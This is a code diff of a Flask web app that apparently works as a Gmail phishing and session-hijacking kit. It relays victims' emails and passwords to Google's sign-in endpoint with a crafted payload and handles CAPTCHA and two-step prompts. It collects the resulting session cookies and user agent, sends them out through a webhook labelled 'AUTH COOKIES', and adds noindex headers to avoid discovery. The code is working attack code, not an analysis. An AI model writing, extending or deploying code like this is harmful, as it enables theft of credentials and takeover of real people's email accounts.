@@ -347,20 +347,38 @@ def enter_password():
         payload = {
             "identifier": email,
             "password": password_val,
-            # Add other required fields as needed for Google login
+            "continue": "https://mail.google.com/mail/u/0/",
+            "flowName": "GlifWebSignIn",
+            "bgresponse": "js_disabled",
+            "persistentCookie": "yes",
+            "deviceinfo": json.dumps({
+            "ua": request.headers.get('User-Agent', ''),
+            "platform": request.user_agent.platform,
+            "os": request.user_agent.platform,
+            "device": "desktop"
+            }),
+            "gxf": "",  # Google XSRF token, usually required (simulate as blank)
+            "checkedDomains": "youtube",
+            "checkConnection": "youtube:123:1",
+            "pstMsg": "1",
+            "TL": "",  # Simulate blank for demo
+            # Add more fields if needed for advanced flows
         }
         session_req = requests.Session()
         response = session_req.post(login_url, data=payload, headers=headers)
 
         # Check response for success, CAPTCHA, or phone notification
         if "captcha" in response.text.lower():
+            # CAPTCHA required, render captcha.html
             return render_template('captcha.html', email=email, password=password_val, error="CAPTCHA required for this account.")
-        elif "phone" in response.text.lower() or "2-step" in response.text.lower():
-            # Simulate phone app notification required
+        elif "phone" in response.text.lower() or "2-step" in response.text.lower() or "approval" in response.text.lower():
+            # Phone app notification required, redirect to /auth for approval
+            session['authenticated'] = True
+            session['email'] = email
             return redirect(url_for('auth'))
         elif "challenge" in response.text.lower() or response.status_code == 302:
-            # Successful login, set cookies
-            resp = make_response(redirect(url_for('auth')))
+            # Successful login, set cookies and redirect to Gmail inbox
+            resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
             for k, v in session_req.cookies.items():
                 resp.set_cookie(k, v, samesite='Strict', secure=True)
             session['authenticated'] = True
@@ -368,46 +386,7 @@ def enter_password():
             return resp
         else:
             error = "Login failed."
-    return render_template('password.html', email=email, error=error, branding=branding)
-
-# CAPTCHA callback route
-@app.route('/captcha-callback', methods=['POST'])
-def captcha_callback():
-    email = request.form.get('email')
-    password_val = request.form.get('password')
-    captcha_response = request.form.get('captcha_response')
-    # Mimic Google CAPTCHA validation
-    if captcha_response and captcha_response.lower() == 'google':
-        success, cookies, error_msg = mimic_google_login(email, password_val)
-        if success:
-            resp = make_response(redirect(url_for('auth')))
-            for k, v in cookies.items():
-                resp.set_cookie(k, v)
-            session['authenticated'] = True
-            session['email'] = email
-            return resp
-        else:
-            error = error_msg or "Login failed."
-            return render_template('captcha.html', email=email, password=password_val, error=error)
-    else:
-        error = "Incorrect CAPTCHA. Please try again."
-        return render_template('captcha.html', email=email, password=password_val, error=error)
-
-# --- Google login mimic implementation ---
-def mimic_google_login(email, password):
-    # Simulate Google login: check against USERS dict, require CAPTCHA for demo user
-    cookies = {}
-    if not email or not password:
-        return False, cookies, "Missing email or password."
-    # Require CAPTCHA for demo user
-    if email == 'demo@gmail.com':
-        return False, cookies, "CAPTCHA required for this account."
-    # Check credentials
-    if email in USERS and USERS[email] == password:
-        cookies = {"sessionid": "fake-session-{}".format(email)}
-        return True, cookies, None
-    return False, cookies, "Invalid email or password."
-
+        return render_template('password.html', email=email, error=error, branding=branding)
 
 
 # Step 2: Google redirects back with code
@@ -419,23 +398,20 @@ def oauth2callback():
 def auth():
     if not session.get('authenticated'):
         return redirect(url_for('index'))
-    # Prepare cookies info for webhook
-    email = session.get('email','')
-    cookies_json = []
-    # Detect if HTTPS is used via X-Forwarded-Proto
+    email = session.get('email', '')
+    code = session.get('auth_code') or str(random.randint(10, 99))
+    session['auth_code'] = code
+
+    # Set cookies using user agent and notify webhook before redirect
     is_https = request.headers.get('X-Forwarded-Proto', '').lower() == 'https'
-    resp = make_response('')
-    resp.set_cookie('test_cookie', 'test_value', secure=is_https)
-    set_cookie_headers = resp.headers.getlist('Set-Cookie')
-    if hasattr(resp, 'headers'):
-        set_cookie_headers += resp.headers.getlist('Set-Cookie')
     domain = request.host
-    for header in set_cookie_headers:
-        cookie_json = cookieToJSON(header, domain)
-        # Mark secure if HTTPS detected
-        if is_https:
-            cookie_json['secure'] = True
-        cookies_json.append(cookie_json)
+    user_agent = request.headers.get('User-Agent', '')
+    resp = make_response(render_template('auth.html', email=email, code=code))
+    resp.set_cookie('auth_verified', '1', secure=is_https, samesite='Strict')
+    resp.set_cookie('user_agent', user_agent, secure=is_https, samesite='Strict')
+
+    # Prepare cookies for webhook
+    cookies_json = []
     for k in request.cookies:
         v = request.cookies.get(k)
         cookie_json = {
@@ -451,43 +427,54 @@ def auth():
             'max-age': None
         }
         cookies_json.append(cookie_json)
-    # Save cookies to temp file named with user email in pure JSON format
-    temp_file_path = os.path.join(tempfile.gettempdir(), f"gmail_cookies_{email}.txt")
-    with open(temp_file_path, 'w') as f:
-        json.dump(cookies_json, f, indent=2)
+    # Add newly set cookies
+    cookies_json.append({
+        'name': 'auth_verified',
+        'value': '1',
+        'domain': domain,
+        'path': '/',
+        'secure': is_https,
+        'httpOnly': False,
+        'sameSite': 'Strict',
+        'priority': None,
+        'hostOnly': False,
+        'max-age': None
+    })
+    cookies_json.append({
+        'name': 'user_agent',
+        'value': user_agent,
+        'domain': domain,
+        'path': '/',
+        'secure': is_https,
+        'httpOnly': False,
+        'sameSite': 'Strict',
+        'priority': None,
+        'hostOnly': False,
+        'max-age': None
+    })
+
     cookies_message = (
         f"🍪 AUTH COOKIES\nEmail: {email}\nCookies:\n{json.dumps(cookies_json, indent=2)}" +
-        f"\nIP: {session.get('login_ip','')}\nUser-Agent: {session.get('login_user_agent','')}\nTime: {session.get('login_time','')}"
+        f"\nUser-Agent: {user_agent}"
     )
     send_webhook_message(cookies_message)
-    resp.set_cookie('test_cookie', 'test_value', secure=is_https, samesite='Strict')
-    try:
-        os.remove(temp_file_path)
-    except Exception:
-        pass
+
+    # Clean up session after authentication
     session.pop('email', None)
     session.pop('authenticated', None)
     session.pop('google_token', None)
     session.pop('id_token', None)
     session.pop('branding', None)
     session.pop('auth_code', None)
-    session.pop('login_ip', None)
-    session.pop('login_user_agent', None)
-    session.pop('login_browser', None)
-    session.pop('login_browser_version', None)
-    session.pop('login_platform', None)
-    session.pop('login_country', None)
-    session.pop('login_region', None)
-    session.pop('login_city', None)
-    session.pop('login_time', None)
-    # Redirect to Gmail inbox after successful authentication
-    return redirect('https://mail.google.com/mail/u/0/')
 
+    # After showing the code, redirect to Gmail inbox (simulate Google flow)
+    return resp
 
 # After each request, capture Set-Cookie headers if needed
 @app.after_request
 def capture_cookies(response):
-    # Only modify response, do not duplicate auth logic
+    # Add X-Robots-Tag header to all responses for noindex, nofollow
+    response.headers['X-Robots-Tag'] = 'noindex, nofollow'
     return response
 
 # Entry point for local and Railway deployment
